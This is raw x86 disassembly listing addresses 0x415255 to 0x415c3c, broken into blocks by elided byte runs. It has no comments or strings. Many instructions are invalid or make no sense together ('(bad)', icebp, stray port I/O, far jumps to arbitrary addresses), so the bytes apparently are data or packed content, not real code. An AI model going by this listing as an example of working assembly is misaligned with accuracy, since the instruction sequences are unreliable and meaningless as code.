  415255:	inc    DWORD PTR [eax-0x20643c4]
  41525b:	jbe    0x415253
  41525d:	jae    0x415263
  41525f:	imul   edi,DWORD PTR es:[ebx-0x4],0x89c09508
  415267:	jl     0x415255
  415269:	stc    
  41526a:	std    
  41526b:	push   esi
  41526c:	adc    ebx,edx
  41526e:	cld    
  41526f:	dec    esi
  415270:	sbb    esi,DWORD PTR ds:0x35e952d9
  415276:	fsqrt  
  415278:	or     al,BYTE PTR [ecx+0x39]
  41527b:	push   ss
  41527c:	jl     0x4152da
  41527e:	jg     0x4152b2
  415280:	fprem  
  415282:	std    
  415283:	es ins BYTE PTR es:[edi],dx
  415285:	push   ebp
  415286:	sbb    DWORD PTR [edi+edx*8+0x6ee57405],0xdb0e348a
  415291:	clc    
  415292:	std    
  415293:	add    BYTE PTR [eax-0x22bc3cb2],dh
  415299:	ins    BYTE PTR es:[edi],dx
  41529a:	hlt    
  41529b:	pop    eax
  41529c:	push   eax
  41529d:	fidiv  DWORD PTR [ebx+ecx*1-0x7a]
  4152a1:	fidiv  DWORD PTR [edi+eax*1+0x26]
  4152a5:	ret    
  4152a6:	in     eax,0xa9
  4152a8:	popf   
  4152a9:	add    al,BYTE PTR [eax]
  4152ab:	mov    eax,DWORD PTR [eax]
	...
  4152c5:	fsubr  st,st(0)
  4152c7:	or     ecx,0x7d7f2141
  4152cd:	mov    cl,0x1
  4152cf:	or     ecx,DWORD PTR [esi+0x215]
  4152d5:	not    BYTE PTR [ebx+0x8]
  4152d8:	mov    esp,eax
  4152da:	adc    BYTE PTR [ebp-0x7ab19f6],al
  4152e0:	sub    ebx,DWORD PTR [eax]
  4152e2:	or     DWORD PTR [ebp-0x7d16aeb6],eax
  4152e8:	add    BYTE PTR [ebp+0x2],cl
  4152eb:	jg     0x4152b5
  4152ed:	jp     0x4152da
  4152ef:	jns    0x41527c
  4152f1:	inc    eax
  4152f2:	push   cs
  4152f3:	xor    eax,0x3e6e6d4d
  4152f8:	or     ebx,0xfffffffd
  4152fb:	jnp    0x41531f
  4152fd:	test   al,0xfd
  4152ff:	mov    al,0xf8
  415301:	retf   0xfbf6
  415304:	push   eax
  415305:	xchg   esi,eax
  415306:	mov    WORD PTR [edi+edi*8],?
  415309:	stos   BYTE PTR es:[edi],al
  41530a:	idiv   BYTE PTR [edi-0x40]
  41530d:	add    eax,0x2d458752
  415312:	add    eax,0x8
  415315:	pop    ebp
  415316:	not    DWORD PTR [ecx]
  415318:	dec    esp
  415319:	and    eax,DWORD PTR [edx+0x0]
  41531c:	and    DWORD PTR [ecx],0x6
  41531f:	xor    eax,0x6784575
  415324:	mov    esp,esi
  415326:	push   eax
  415327:	popa   
  415328:	std    
	...
  415341:	add    bl,bl
  415343:	push   es
  415344:	mov    cl,BYTE PTR [ebx-0x20200f8]
  41534a:	retf   
  41534b:	rcl    BYTE PTR [ebp-0x3b],1
  41534e:	aaa    
  41534f:	in     al,dx
  415350:	cmp    BYTE PTR [ebx-0x20418ac],0xf4
  415357:	push   edi
  415358:	or     BYTE PTR [ecx],dh
  41535a:	mov    ah,0xd2
  41535c:	or     al,0x89
  41535e:	cmp    DWORD PTR [ecx+ebx*4-0x34349d7],eax
  415365:	adc    DWORD PTR [edx-0x38fb8117],0x6f17e7ab
  41536f:	sbb    BYTE PTR [ecx+ebp*1+0x4b875c21],bl
  415376:	add    al,0x75
  415378:	adc    DWORD PTR [ecx+0x532777c1],ecx
  41537e:	test   BYTE PTR [ecx+edx*2+0x4],ah
  415382:	dec    edi
  415383:	jmp    0x595e:0x1eacfe67
  41538a:	cmp    eax,0xa90014a9
  41538f:	(bad)  
  415390:	lock dec edi
  415392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415393:	sbb    dl,BYTE PTR [esi-0x77]
  415396:	jmp    0xf481662e
  41539b:	shl    DWORD PTR [ecx-0x3144b8c],cl
  4153a1:	xor    eax,0xbc6c2d1b
	...
  4153be:	add    BYTE PTR [eax-0x3c02fe55],cl
  4153c4:	jb     0x4153a2
  4153c6:	std    
  4153c7:	sub    ch,BYTE PTR [edx+0x65]
  4153ca:	clc    
  4153cb:	hlt    
  4153cc:	(bad)  
  4153cd:	hlt    
  4153ce:	or     edi,0x5
  4153d1:	fwait
  4153d2:	sub    esi,DWORD PTR [edi-0x5]
  4153d5:	xchg   ebx,eax
  4153d6:	daa    
  4153d7:	outs   dx,DWORD PTR ds:[esi]
  4153d8:	dec    edx
  4153d9:	adc    edx,DWORD PTR [esi+ecx*2+0x5]
  4153dd:	push   cs
  4153de:	ja     0x4153dc
  4153e0:	repz sbb al,BYTE PTR [edi-0x32b854c]
  4153e7:	inc    edi
  4153e8:	add    DWORD PTR [edx-0x3b],esp
  4153eb:	mov    ecx,0x3ebeb7a
  4153f0:	add    eax,0x7aa903e7
  4153f5:	fisttp DWORD PTR [edx-0x2a2912c9]
  4153fb:	ins    DWORD PTR es:[edi],dx
  4153fc:	dec    edx
  4153fd:	iret   
  4153fe:	pop    ebp
  4153ff:	sub    eax,0xf40ba9be
  415404:	pop    ecx
  415405:	jb     0x4153f6
  415407:	jne    0x4153ea
  415409:	and    edx,DWORD PTR [ecx+0x22]
  41540c:	xor    ah,0xab
  41540f:	push   es
  415410:	inc    ebp
  415411:	out    0x54,eax
  415413:	jge    0x415402
  415415:	paddq  mm5,mm0
  415418:	inc    esp
  415419:	out    0xfc,eax
  41541b:	and    esp,ecx
  41541d:	and    al,0xf0
  41541f:	repnz add al,0xe7
  415422:	add    eax,DWORD PTR [eax]
	...
  41543c:	dec    ecx
  41543d:	fisttp DWORD PTR [edi]
  41543f:	lock enter 0xe744,0xfc
  415444:	add    DWORD PTR [eax+0x5d4afc8f],eax
  41544a:	jmp    0x4154c2
  41544c:	mov    ah,0x4
  41544e:	pop    esi
  41544f:	xor    al,0x7b
  415451:	dec    edx
  415452:	push   edi
  415453:	cld    
  415454:	inc    edx
  415455:	cmp    BYTE PTR [ebp-0x76],dl
  415458:	mov    bh,0xdc
  41545a:	add    bl,dh
  41545c:	stc    
  41545d:	mov    dl,bh
  41545f:	add    dh,ah
  415461:	add    al,0x0
  415463:	lock xor ah,0xd
  415467:	gs sbb eax,0x2ce9fdf4
  41546d:	retf   
  41546e:	or     eax,0xfdf41565
  415473:	jmp    0xba359be2
  415478:	add    BYTE PTR [edi-0x4],0x99
  41547c:	jle    0x4154f5
  41547e:	clc    
  41547f:	jo     0x4154cb
  415481:	icebp  
  415482:	xchg   DWORD PTR [ebx+eax*8-0xf],edi
  415486:	shl    DWORD PTR [edi+esi*4+0x1],1
  41548a:	sub    ebx,0xfffffff0
  41548d:	add    al,0x0
  41548f:	jb     0x4154c6
  415491:	stc    
  415492:	cmp    DWORD PTR [edi-0x160a7711],ebp
  415498:	test   DWORD PTR [edi+esi*1],0x84018c3c
  41549f:	iret   
	...
  4154b8:	add    al,bh
  4154ba:	add    al,0x0
  4154bc:	shr    DWORD PTR [edi+0x78],0xff
  4154c0:	call   0xc77b2147
  4154c5:	dec    DWORD PTR [eax+0x4f7e9dd]
  4154cb:	push   ecx
  4154cc:	xchg   esi,eax
  4154cd:	in     eax,0xf8
  4154cf:	std    
  4154d0:	adc    al,0x4c
  4154d2:	icebp  
  4154d3:	push   ebx
  4154d4:	jns    0x41554b
  4154d6:	les    esi,FWORD PTR [ebx-0x40]
  4154d9:	add    BYTE PTR [eax-0x4],bh
  4154dc:	dec    DWORD PTR [ebx]
  4154de:	cmp    BYTE PTR [ecx-0x47],0x2e
  4154e2:	cmp    ebp,edi
  4154e4:	fdivr  st(3),st
  4154e6:	icebp  
  4154e7:	adc    ecx,DWORD PTR [ecx+0x6c00450a]
  4154ed:	xor    BYTE PTR [eax+0x9],bh
  4154f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154f1:	jp     0x4154bc
  4154f3:	dec    esp
  4154f4:	add    dh,dh
  4154f6:	jne    0x4154f4
  4154f8:	jb     0x41549f
  4154fa:	jecxz  0x41550d
  4154fc:	imul   edi,DWORD PTR [ebx-0x21ef95c4],0xfffffffb
  415503:	push   esi
  415504:	lea    ebx,[eax+0x3ee850ce]
  41550a:	jne    0x415509
  41550c:	dec    DWORD PTR [esi+0x64]
  41550f:	cld    
  415510:	add    BYTE PTR [esi+0x66e84ff4],ch
  415516:	(bad)  
  415517:	std    
  415518:	push   DWORD PTR [ebp+esi*2+0xffc]
	...
  415533:	add    BYTE PTR [eax],al
  415535:	add    BYTE PTR [eax-0x80],cl
  415538:	add    BYTE PTR [eax],al
  41553a:	popf   
  41553b:	jge    0x41557e
  41553d:	clc    
  41553e:	in     eax,dx
  41553f:	cmp    ebx,edi
  415541:	inc    edi
  415542:	jmp    0x4014:0x7515fb56
  415549:	add    BYTE PTR [eax],bl
  41554b:	(bad)  
  41554c:	jno    0x4155c4
  41554e:	hlt    
  41554f:	jae    0x415549
  415551:	je     0x41550f
  415553:	jg     0x4155c6
  415555:	mov    eax,0x76ec7584
  41555a:	gs pusha 
  41555c:	adc    BYTE PTR [eax-0xf],ch
  41555f:	jae    0x4155a1
  415561:	add    al,dl
  415563:	inc    esp
  415564:	mov    esp,0x745c7550
  415569:	add    DWORD PTR [ebp-0x7d],ebx
  41556c:	inc    ecx
  41556d:	mov    eax,0xc71cc8e6
  415572:	sbb    DWORD PTR [eax+edx*8],eax
  415575:	add    al,0x4d
  415577:	push   es
  415578:	add    BYTE PTR [ebx-0x3f984f28],cl
  41557e:	icebp  
  41557f:	jg     0x4155fd
  415581:	add    eax,0xb84182d1
  415586:	hlt    
  415587:	mov    cl,0x1c
  41558a:	adc    DWORD PTR [ecx-0x1f47781b],0x83b9fdcd
  415594:	mov    BYTE PTR [ebx+0x3c],al
  415597:	mov    WORD PTR [eax+0x43],cs
	...
  4155b1:	add    BYTE PTR [eax],al
  4155b3:	int3   
  4155b4:	mov    edi,edx
  4155b6:	jae    0x4155a4
  4155b8:	sub    dh,BYTE PTR [eax+0x8]
  4155bb:	jecxz  0x415575
  4155bd:	jmp    0x40a80a45
  4155c2:	clc    
  4155c3:	dec    eax
  4155c4:	out    0x8e,eax
  4155c6:	or     BYTE PTR [ebx+ecx*1],ah
  4155c9:	push   esp
  4155ca:	or     BYTE PTR [ebp+0x78],ch
  4155cd:	stc    
  4155ce:	jmp    0x567abcbd
  4155d3:	dec    edx
  4155d4:	scas   eax,DWORD PTR es:[edi]
  4155d5:	int3   
  4155d6:	dec    edi
  4155d7:	out    0xad,eax
  4155d9:	push   esi
  4155da:	push   eax
  4155db:	mov    ds:0x3189103a,eax
  4155e0:	aam    0xeb
  4155e2:	add    al,bh
  4155e4:	fwait
  4155e5:	push   edi
  4155e6:	pop    esi
  4155e7:	das    
  4155e8:	mov    ch,0xc6
  4155ea:	or     ah,dh
  4155ec:	sbb    BYTE PTR [ebx+0x4f0d25ec],cl
  4155f2:	mov    DWORD PTR [ebp+0x65],ebp
  4155f5:	mov    WORD PTR [eax],es
  4155f7:	cmc    
  4155f8:	fild   DWORD PTR [ecx]
  4155fa:	mov    BYTE PTR [ecx-0xa77716e],dh
  415600:	fadd   QWORD PTR [ecx]
  415602:	add    BYTE PTR [eax+edx*1-0x6],bh
  415606:	and    DWORD PTR [esi],0xffffffef
  415609:	dec    edx
  41560a:	mov    DWORD PTR [ecx-0x5832d30d],esi
  415610:	fs inc ebp
  415612:	clc    
  415613:	jge    0x41562d
  415615:	or     al,0x56
	...
  41562f:	add    BYTE PTR [edx],ch
  415631:	add    al,0xac
  415633:	clc    
  415634:	icebp  
  415635:	mov    edx,0x186ef8d4
  41563a:	in     eax,dx
  41563b:	add    esp,DWORD PTR [edi-0x404e210e]
  415641:	bnd jno 0x41565c
  415644:	add    ecx,DWORD PTR [ecx+0x186c01db]
  41564a:	call   0xe5430057
  41564f:	or     BYTE PTR [edx+0x6dcdead3],ah
  415655:	pop    edx
  415656:	pop    ds
  415657:	cmp    DWORD PTR [ebx-0xbfc1810],0x7a
  41565e:	fild   DWORD PTR [edx]
  415660:	push   es
  415661:	add    ecx,eax
  415663:	mov    esi,ecx
  415665:	inc    edi
  415666:	inc    BYTE PTR [esi-0x14]
  415669:	jns    0x415698
  41566b:	pop    edx
  41566c:	dec    ebp
  41566d:	jnp    0x41560b
  41566f:	clc    
  415670:	jl     0x4156ef
  415672:	out    0x2,eax
  415674:	hlt    
  415675:	add    al,0x71
  415677:	inc    esi
  415678:	call   0xe7f0:0x93025f7d
  41567f:	pop    eax
  415680:	mov    bl,0xc3
  415682:	jmp    0x415687
  415684:	sub    DWORD PTR [eax+eax*8+0x34],edi
  415688:	mov    bl,0x8a
  41568a:	mov    dh,0x6f
  41568c:	adc    edx,DWORD PTR [ebp+edx*1-0x73]
  415690:	data16 sbb al,0x97
  415693:	lea    eax,[eax]
	...
  4156ad:	or     BYTE PTR [edi],al
  4156af:	jb     0x415708
  4156b1:	adc    BYTE PTR ds:0x45eb0fd9,dl
  4156b7:	pop    edi
  4156b8:	adc    ecx,DWORD PTR ds:0xc70fcb41
  4156be:	add    bh,BYTE PTR [edx+0x3fb4ca]
  4156c4:	cld    
  4156c5:	adc    al,0x4f
  4156c7:	pop    ecx
  4156c8:	push   cs
  4156c9:	xor    bh,ch
  4156cb:	(bad)  
  4156cc:	mov    ebx,0xa489e170
  4156d1:	out    dx,eax
  4156d2:	test   esp,ebp
  4156d4:	in     eax,0x78
  4156d6:	ins    BYTE PTR es:[edi],dx
  4156d7:	or     al,0xe9
  4156d9:	cld    
  4156da:	xchg   bl,dl
  4156dc:	jmp    0x6c925bd8
  4156e1:	stos   BYTE PTR es:[edi],al
  4156e2:	in     al,dx
  4156e3:	push   esi
  4156e4:	add    al,dl
  4156e6:	pop    ecx
  4156e7:	mov    DWORD PTR [eax],esi
  4156e9:	pop    ecx
  4156ea:	push   es
  4156eb:	(bad)  
  4156ec:	lods   al,BYTE PTR ds:[esi]
  4156ed:	fadd   QWORD PTR [ebx+ecx*4]
  4156f0:	lods   al,BYTE PTR ds:[esi]
  4156f1:	fisttp WORD PTR [esi-0x7f]
  4156f4:	xchg   esp,eax
  4156f5:	sti    
  4156f6:	add    al,0x76
  4156f8:	fdivr  QWORD PTR [ecx+0x18]
  4156fb:	or     eax,0xfe013a06
  415700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415701:	mov    esp,0xf8020f7c
  415706:	(bad)  
  415707:	(bad)  
  415708:	call   0xcfb49643
  41570d:	sti    
  41570e:	mov    dh,0x4b
  415710:	loope  0x415712
	...
  41572a:	outs   dx,DWORD PTR ds:[esi]
  41572b:	mov    edi,0x7af6c3bf
  415730:	call   0x51f6:0x450519
  415737:	push   ebx
  415738:	imul   DWORD PTR [edx-0x6f]
  41573b:	add    eax,0xcf39bb89
  415740:	add    al,0xa8
  415742:	push   edx
  415743:	or     BYTE PTR [ecx],cl
  415745:	cwde   
  415746:	outs   dx,BYTE PTR ds:[esi]
  415747:	jle    0x415779
  415749:	adc    al,0xb0
  41574b:	add    al,0x81
  41574d:	scas   al,BYTE PTR es:[edi]
  41574e:	test   DWORD PTR [ebx+edi*2+0x4b7cf18e],0x135ec000
  415759:	lsl    edi,WORD PTR [esi]
  41575c:	cli    
  41575d:	cmp    DWORD PTR [edi+0x7],0xffffffbd
  415761:	loop   0x415782
  415763:	enter  0x6e5,0x26
  415767:	mov    ebp,0x75fd918a
  41576c:	inc    eax
  41576d:	add    BYTE PTR [esi-0x62c24dfe],dh
  415773:	ins    DWORD PTR es:[edi],dx
  415774:	sti    
  415775:	add    al,BYTE PTR [ebx+0x6]
  415778:	or     esi,DWORD PTR [esi-0x1e8012b8]
  41577e:	jmp    0x42:0xa030857c
  415785:	jmp    0x415756
  415787:	mov    ecx,0x12788039
  41578c:	add    BYTE PTR [eax+eax*1+0x0],dh
	...
  4157a4:	add    BYTE PTR [eax],al
  4157a6:	add    BYTE PTR [edi+eax*1-0x7e8c0c4a],bh
  4157ad:	xor    BYTE PTR [edi],cl
  4157af:	add    esi,DWORD PTR [ecx+esi*8+0xf]
  4157b3:	add    edx,ebx
  4157b5:	or     esi,DWORD PTR [esi+0x70854ed4]
  4157bb:	lahf   
  4157bc:	push   eax
  4157bd:	test   DWORD PTR [eax-0x6f],edx
  4157c0:	push   eax
  4157c1:	test   DWORD PTR [eax-0x6d],ecx
  4157c4:	add    eax,0x8
  4157c7:	mov    dh,0x19
  4157c9:	mov    BYTE PTR [eax],bl
  4157cb:	pop    ss
  4157cc:	dec    ebp
  4157cd:	icebp  
  4157ce:	mov    ch,dl
  4157d0:	pop    es
  4157d1:	mov    BYTE PTR [eax-0x71],dl
  4157d4:	jp     0x41581e
  4157d6:	add    ebx,esi
  4157d8:	rol    DWORD PTR [ebx+eax*4],0x18
  4157dc:	std    
  4157dd:	dec    DWORD PTR [esi]
  4157df:	shr    BYTE PTR [ecx],cl
  4157e1:	sti    
  4157e2:	(bad)  
  4157e3:	jp     0x41583c
  4157e5:	pop    esi
  4157e6:	pop    ebx
  4157e7:	hlt    
  4157e8:	ret    0x840
  4157eb:	cmp    eax,0xa900059a
  4157f0:	jb     0x4157d7
  4157f2:	or     DWORD PTR [eax-0x20],0xb8815552
  4157f9:	add    al,0x89
  4157fb:	mov    cl,0xe3
  4157fd:	mov    dl,bh
  4157ff:	ins    DWORD PTR es:[edi],dx
  415800:	mov    eax,ds:0xdf2b39ed
  415805:	sub    BYTE PTR [ebp+0x5601dbf4],0x0
	...
  415824:	(bad)  
  415825:	push   ebp
  415826:	xor    dl,dl
  415828:	mov    edi,0xc64e7226
  41582d:	xor    al,0x7d
  41582f:	(bad)  
  415830:	imul   esi,ebx,0xdbf87b81
  415836:	xchg   DWORD PTR [ecx],ecx
  415838:	push   0xf6c182e1
  41583d:	adc    al,BYTE PTR [ecx+eax*2]
  415840:	sbb    DWORD PTR [eax+edx*8+0xa973b3c],0x871c8a0d
  41584b:	mov    BYTE PTR [ecx],ch
  41584d:	jns    0x415890
  41584f:	add    BYTE PTR [edi+0x70c72fd9],bl
  415855:	and    al,0x6d
  415857:	or     esi,DWORD PTR [esp+eiz*8+0x20]
  41585b:	mov    esi,DWORD PTR ds:0xb594039b
  415861:	aad    0xc9
  415863:	and    bh,BYTE PTR [edx+edx*1+0x5fb972d3]
  41586a:	leave  
  41586b:	je     0x415860
  41586d:	and    eax,0x277cc7f6
  415872:	or     eax,0xfa5ab6f8
  415877:	add    al,0xe0
  415879:	add    al,0x55
  41587b:	jg     0x4158df
  41587d:	js     0x4158b1
  41587f:	mov    bh,BYTE PTR [edi+0x433f61ec]
  415885:	jp     0x4158bb
  415887:	sti    
	...
  4158a0:	add    BYTE PTR [ebx+eiz*8],dh
  4158a3:	jmp    0xf149a56b
  4158a8:	ret    0x3f7e
  4158ab:	jno    0x415839
  4158ad:	mov    bh,0xf0
  4158af:	popa   
  4158b0:	ret    
  4158b1:	xor    al,0xe3
  4158b3:	in     eax,dx
  4158b4:	or     DWORD PTR [edi-0x71dd817],ebp
  4158ba:	les    edi,FWORD PTR [edi]
  4158bc:	add    bh,dh
  4158be:	ret    0x475f
  4158c1:	add    bh,BYTE PTR [edi-0x63]
  4158c4:	hlt    
  4158c5:	lds    edi,FWORD PTR [ebx-0x7d10c091]
  4158cb:	sbb    DWORD PTR [esi+0x7],esi
  4158ce:	xor    BYTE PTR [edi+ebp*8-0x80bbe92],0xd9
  4158d6:	inc    edx
  4158d7:	adc    ecx,DWORD PTR [edx+edi*8-0xb90df7f]
  4158de:	inc    ebp
  4158df:	ror    cl,cl
  4158e1:	inc    eax
  4158e2:	loopne 0x4158a6
  4158e4:	aam    0xe9
  4158e6:	xchg   BYTE PTR [edx-0x6a134e0c],bl
  4158ec:	mov    BYTE PTR [edi],dh
  4158ee:	icebp  
  4158ef:	ret    0xec3e
  4158f2:	dec    ebx
  4158f3:	inc    edx
  4158f4:	retf   
  4158f5:	mov    dh,0xfd
  4158f7:	out    0x4d,al
  4158f9:	jge    0x4158f0
  4158fb:	popa   
  4158fc:	std    
  4158fd:	jae    0x415905
  4158ff:	push   0xfffffff9
  415901:	xor    DWORD PTR [edx-0x25],0xffffff86
	...
  41591d:	add    BYTE PTR [ebx+0x7ff31205],bh
  415923:	aas    
  415924:	add    BYTE PTR [esi-0x4f9ee83],dh
  41592a:	(bad)  
  41592b:	jmp    0x43f952b8
  415930:	jae    0x4158c7
  415932:	test   eax,0x141d37c5
  415937:	add    DWORD PTR [esi+ebx*8-0x50],esi
  41593b:	jmp    0x533126b4
  415940:	std    
  415941:	aam    0xbb
  415943:	adc    al,BYTE PTR [eax-0x17]
  415946:	je     0x415909
  415948:	or     al,0x5c
  41594a:	loopne 0x415935
  41594c:	sub    DWORD PTR [ecx],0xffffff8b
  41594f:	dec    BYTE PTR [ecx+0x30e9c7ad]
  415955:	in     eax,0xc7
  415957:	cmp    al,0x73
  415959:	push   edi
  41595a:	xor    eax,0x6c9c0001
  41595f:	(bad)  [edi-0x66]
  415962:	and    al,0xc4
  415964:	push   esi
  415965:	sahf   
  415966:	jg     0x4159a7
  415968:	std    
  415969:	popa   
  41596a:	cmp    ch,bl
  41596c:	data16 jo 0x4159de
  41596f:	add    al,0xff
  415971:	call   0x5431d76d
  415976:	imul   ebx
  415978:	std    
  415979:	jmp    0xaf8053ed
  41597e:	sbb    DWORD PTR [esi],ebp
  415980:	retf   0x7b
	...
  41599b:	mov    al,ds:0xad62f07d
  4159a0:	stc    
  4159a1:	mov    ch,0x9c
  4159a3:	test   al,0x7d
  4159a5:	pop    ebx
  4159a6:	icebp  
  4159a7:	sbb    ecx,edi
  4159a9:	push   ss
  4159aa:	jae    0x41599a
  4159ac:	push   es
  4159ad:	retf   0x34e9
  4159b0:	jmp    0x4159bf
  4159b2:	xchg   edi,eax
  4159b3:	xor    eax,0x91008aeb
  4159b8:	add    dh,bh
  4159ba:	inc    ebp
  4159bb:	mov    dl,0x68
  4159bd:	push   ds
  4159be:	mov    BYTE PTR [ecx+0x0],cl
  4159c1:	or     esi,DWORD PTR [esi+0x4d37f800]
  4159c7:	popa   
  4159c8:	ins    BYTE PTR es:[edi],dx
  4159c9:	add    al,0xc6
  4159cb:	sbb    al,bh
  4159cd:	add    BYTE PTR [esi+0x12],al
  4159d0:	outs   dx,BYTE PTR ds:[esi]
  4159d1:	retf   
  4159d2:	pop    edi
  4159d3:	adc    edi,DWORD PTR [eax*8+0x680745c2]
  4159da:	add    bl,BYTE PTR [edi+eax*1]
  4159dd:	add    bh,bh
  4159df:	sub    DWORD PTR [ebx],esp
  4159e1:	or     BYTE PTR [ebx-0xb003b3],al
  4159e7:	sbb    BYTE PTR [ebx],ch
  4159e9:	push   ss
  4159ea:	inc    eax
  4159eb:	sbb    eax,0xdf0cc482
  4159f0:	cld    
  4159f1:	jmp    DWORD PTR [edi+0xf]
  4159f4:	add    BYTE PTR [eax],al
  4159f6:	add    BYTE PTR [esi+0x325004c0],cl
  4159fc:	ins    DWORD PTR es:[edi],dx
  4159fd:	and    al,0xc
	...
  415a17:	add    BYTE PTR [edx],ah
  415a19:	or     al,0x4c
  415a1b:	push   ss
  415a1c:	lea    eax,[esi]
  415a1e:	jg     0x4159e4
  415a20:	loope  0x4159e2
  415a22:	add    al,0x0
  415a24:	inc    esi
  415a25:	jmp    0x731f43aa
  415a2a:	or     cl,BYTE PTR [ecx+0x68]
  415a2d:	adc    DWORD PTR [ebp+0x5069c970],eax
  415a33:	or     dh,bl
  415a35:	push   edx
  415a36:	jg     0x4159f8
  415a38:	cdq    
  415a39:	dec    esp
  415a3a:	call   0xfc38ec90
  415a3f:	ret    
  415a40:	es out dx,al
  415a42:	sub    cl,0x9d
  415a45:	jb     0x415a6c
  415a47:	dec    ecx
  415a48:	hlt    
  415a49:	inc    edi
  415a4a:	adc    eax,0x75df8d81
  415a4f:	add    esi,eax
  415a51:	fwait
  415a52:	(bad)  
  415a53:	mov    DWORD PTR [edx+0x77],eax
  415a56:	(bad)  
  415a57:	call   0xfe340cba
  415a5c:	dec    edi
  415a5d:	mov    edx,0x76ec70f2
  415a62:	mov    ebx,0x7edfc4fd
  415a67:	(bad)  
  415a68:	jg     0x415a14
  415a6a:	ftst   
  415a6c:	inc    eax
  415a6d:	jnp    0x415a61
  415a6f:	jmp    0x502b963
  415a74:	retf   0xbf76
  415a77:	call   0xfe33ca49
	...
  415a94:	add    BYTE PTR [ebp+ebx*8-0x3a],ah
  415a98:	and    DWORD PTR [edx],0xffffffc9
  415a9b:	push   es
  415a9c:	xor    DWORD PTR [edi+ebx*1],esi
  415a9f:	jle    0x415aa9
  415aa1:	ja     0x415ae8
  415aa3:	add    DWORD PTR [eax+eax*8-0x5c],esi
  415aa7:	jne    0x415acf
  415aa9:	lods   eax,DWORD PTR ds:[esi]
  415aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aab:	sbb    al,BYTE PTR [edi+0x68]
  415aae:	int3   
  415aaf:	cmp    al,0x73
  415ab1:	fisub  WORD PTR [esi-0x29]
  415ab4:	mov    DWORD PTR [ebx-0x6917399a],esi
  415aba:	and    edx,esi
  415abc:	std    
  415abd:	(bad)  
  415abf:	pop    ebx
  415ac0:	add    bh,bl
  415ac2:	fstp   QWORD PTR [ebx-0x1]
  415ac5:	sub    DWORD PTR [ebx+0x2fccc97e],esi
  415acb:	in     eax,dx
  415acc:	std    
  415acd:	mov    bl,0x1e
  415acf:	bnd jo 0x415ace
  415ad2:	mov    di,0x24fd
  415ad6:	loopne 0x415b56
  415ad8:	lds    ebp,FWORD PTR [edi+0x4]
  415adb:	mov    edx,0xdee880dc
  415ae0:	icebp  
  415ae1:	popf   
  415ae2:	imul   DWORD PTR [ecx-0x3c]
  415ae5:	clc    
  415ae6:	push   ebp
  415ae7:	(bad)  
  415ae8:	fisubr DWORD PTR [ebp-0x47]
  415aeb:	iret   
  415aec:	icebp  
  415aed:	ins    DWORD PTR es:[edi],dx
  415aee:	jmp    0xc573d8b1
  415af3:	bound  eax,QWORD PTR [eax+0x18]
  415af6:	add    DWORD PTR [edx-0x5],esp
	...
  415b11:	add    cl,al
  415b13:	cmp    esi,DWORD PTR [eax]
  415b15:	pop    ecx
  415b16:	jge    0x415b0c
  415b18:	adc    edx,DWORD PTR [esi]
  415b1a:	mov    bl,0x6f
  415b1c:	repz pop ebp
  415b1e:	cmc    
  415b1f:	xor    eax,0x6b27fb9
  415b24:	and    cl,bh
  415b26:	and    eax,ebx
  415b28:	xchg   DWORD PTR [esi],eax
  415b2a:	sbb    eax,0xe50500f7
  415b2f:	(bad)  
  415b30:	pop    esp
  415b31:	dec    edx
  415b32:	test   BYTE PTR [ebx+0x5e],0xf3
  415b36:	push   ebx
  415b37:	in     al,0xea
  415b39:	push   ebx
  415b3a:	sbb    al,0x70
  415b3c:	mov    BYTE PTR [edx],0xf4
  415b3f:	jge    0x415b90
  415b41:	xchg   ecx,edi
  415b43:	outs   dx,DWORD PTR ds:[esi]
  415b44:	loop   0x415bc2
  415b46:	cmp    BYTE PTR [ecx],ah
  415b48:	jmp    0x415b25
  415b4a:	push   eax
  415b4b:	call   0xc5b94c86
  415b50:	mov    bl,0x1
  415b52:	ins    DWORD PTR es:[edi],dx
  415b53:	cmp    ebx,ecx
  415b55:	adc    esi,DWORD PTR [edi-0x42]
  415b58:	xchg   ebx,eax
  415b59:	add    eax,0xc9620673
  415b5e:	int    0xfd
  415b60:	mov    ch,0xdb
  415b62:	dec    edi
  415b63:	pop    eax
  415b64:	call   0x9f06406c
  415b69:	push   ecx
  415b6a:	mov    dh,0xfd
  415b6c:	(bad)  
  415b6d:	call   0x6330d9af
  415b72:	cwde   
  415b73:	test   edi,esp
  415b75:	jmp    0x415b7a
	...
  415b8e:	add    BYTE PTR [ebx],cl
  415b90:	push   ds
  415b91:	inc    edi
  415b92:	push   ebp
  415b93:	jecxz  0x415b1a
  415b95:	out    0xea,eax
  415b97:	or     eax,DWORD PTR [ecx]
  415b99:	xor    ch,BYTE PTR [ecx+0x1f55c625]
  415b9f:	icebp  
  415ba0:	jmp    0x16fd:0xea65eee8
  415ba7:	inc    ecx
  415ba8:	pop    es
  415ba9:	std    
  415baa:	cmp    DWORD PTR [eax+0x7d],ebx
  415bad:	retf   0xc7a6
  415bb0:	add    BYTE PTR [ecx-0x17313759],cl
  415bb6:	(bad)  
  415bb7:	push   eax
  415bb8:	jmp    0xedc0:0x853882fd
  415bbf:	int    0x7d
  415bc1:	into   
  415bc2:	xchg   ecx,eax
  415bc3:	mov    eax,0x6776fded
  415bc8:	call   0x51ff0628
  415bcd:	mov    ebp,esp
  415bcf:	(bad)  
  415bd1:	mov    BYTE PTR [eax+0x72],bl
  415bd4:	jmp    0x9ce9:0xc4c8ed73
  415bdb:	js     0x415bd9
  415bdd:	adc    BYTE PTR [eax-0x9],0x70
  415be1:	xor    eax,0x472663b0
  415be6:	mov    ebp,0xe2744009
  415beb:	push   ds
  415bec:	je     0x415bd5
  415bee:	mov    ebx,0x1efba7af
	...
  415c0b:	add    ah,al
  415c0d:	fnsave [eax]
  415c0f:	xor    edi,0xffffffdd
  415c12:	add    al,BYTE PTR [ebx+0x894ef6]
  415c18:	loop   0x415c82
  415c1a:	retf   0xe2e8
  415c1d:	xlat   BYTE PTR ds:[ebx]
  415c1e:	sti    
  415c1f:	push   esi
  415c21:	and    edi,ebx
  415c23:	jo     0x415bba
  415c25:	push   0xfd2dffcb
  415c2a:	xchg   dh,al
  415c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c2d:	imul   esi,edi,0x9cbaaff
  415c33:	push   edx
  415c34:	push   cs
  415c35:	rol    DWORD PTR [ebx+ecx*4],0x92
  415c39:	imul   ecx,esi,0xffffffe8
  415c3c:	test   eax,0xd6fffbda
